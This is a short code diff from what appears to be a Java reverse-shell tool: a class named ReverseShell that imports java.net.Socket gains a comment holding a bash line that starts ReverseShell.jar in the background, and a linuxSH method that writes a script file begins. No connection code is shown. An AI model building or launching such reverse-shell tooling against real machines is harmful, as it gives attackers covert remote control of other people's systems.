@@ -5,6 +5,12 @@ import java.net.Socket;
 @SuppressWarnings("all")
 class ReverseShell {
 
+    /**
+     *
+     * #!/bin/bash
+     * java -jar jar/ReverseShell.jar &
+     *
+     */
 
     public static void linuxSH(){
         String pathFile = "scripts/script.sh",
